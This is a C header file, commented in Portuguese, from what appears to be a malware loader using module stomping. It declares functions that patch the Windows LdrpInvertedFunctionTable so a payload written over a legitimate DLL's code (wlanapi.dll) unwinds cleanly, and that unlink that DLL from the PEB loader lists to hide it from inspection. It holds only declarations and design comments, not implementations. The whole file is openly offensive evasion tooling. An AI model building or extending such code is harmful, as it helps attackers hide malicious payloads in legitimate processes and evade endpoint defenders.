/* stub_evasion.h — Tier-S evasion (Fase 8).
 *
 * P8.1 — InvertedFunctionTable patch
 *   Após o stomp, RtlVirtualUnwind sobre frames dentro da victim usa entries
 *   de exception table da DLL legítima.  Como o `.text` foi sobrescrito,
 *   prólogos não batem e unwinds podem detonar.  Repointamos a entry da
 *   victim em `LdrpInvertedFunctionTable` para a `.pdata` do payload
 *   (que descreve corretamente os prólogos do svc.dll).
 *
 * P8.2 — PEB->Ldr unlink
 *   Remove a victim das três listas LDR (InLoad, InMemory, InInit) e
 *   esvazia o BaseDllName/FullDllName, escondendo a presença da DLL para
 *   walks via PEB.  Não quebra nada porque ninguém em svc.dll faz
 *   GetModuleHandle("wlanapi.dll") — só precisamos do address space.
 */
#pragma once
#include <windows.h>
#include "stub_pe_parser.h"
#include "stub_victim.h"

#ifdef __cplusplus
extern "C" {
#endif

/* P8.1 — patcheia LdrpInvertedFunctionTable.  Retorna 0 em sucesso.
 * Falha não-fatal: stack walks ficam suboptimal mas processo continua. */
int  StubEvasion_PatchInvertedTable(const StubPE* pe, const StubVictim* v);

/* Reverte a entry da InvertedFunctionTable para os valores originais.
 * Chamado em StubStomp_Revert. */
void StubEvasion_RestoreInvertedTable(void);

/* P8.2 — desenrola victim das três listas LDR do PEB.
 * Salva ponteiros internamente para a Restore. */
int  StubEvasion_UnlinkPEBEntry(const StubVictim* v);

/* Reanexa a victim ao PEB->Ldr (chamado no Revert). */
void StubEvasion_RelinkPEBEntry(void);

#ifdef __cplusplus
}
#endif
